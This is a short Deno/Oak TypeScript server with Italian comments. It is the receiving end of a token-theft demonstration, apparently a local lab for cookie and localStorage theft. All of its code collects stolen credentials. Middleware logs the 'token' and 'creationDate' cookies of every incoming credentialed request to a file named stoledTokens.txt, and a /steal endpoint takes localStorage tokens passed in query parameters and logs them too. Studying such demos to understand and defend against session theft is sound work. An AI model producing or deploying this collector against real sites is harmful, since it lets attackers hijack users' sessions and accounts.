import { Application, Router, Context } from "https://deno.land/x/oak/mod.ts";
import { oakCors } from "https://deno.land/x/cors/mod.ts";

const app = new Application();
const router = new Router();

app.use(oakCors({origin: "http://localhost:3000", credentials: true}));
app.use(router.routes());

async function saveToken(token: any, creationDate: any) {
  if (token) {
    const fileEntry = token + " | " + creationDate;
    await Deno.writeTextFile("./stoledTokens.txt", `${fileEntry}\n`, {append: true});
  }
}

// in questa maniera il cookie verrebbe rubato da ogni endpoint, non solo da /steal
router.use(async (ctx: Context, next: () => Promise<void>) => {
  await next();
  await saveToken(ctx.cookies.get("token"), ctx.cookies.get("creationDate"));
});

// il localStorage lo rubo solo da qui essendo che non viene aggiunto automaticamente uso i queryparams
router.get("/steal", async (ctx: Context) => {
  await saveToken(ctx.request.url.searchParams.get('token'), "---");
  ctx.response.body = new TextEncoder().encode(`
    <p>Stoled cookies & localStorage at the <b>same</b> time</p>
  `);
});

await app.listen({port: 8000});
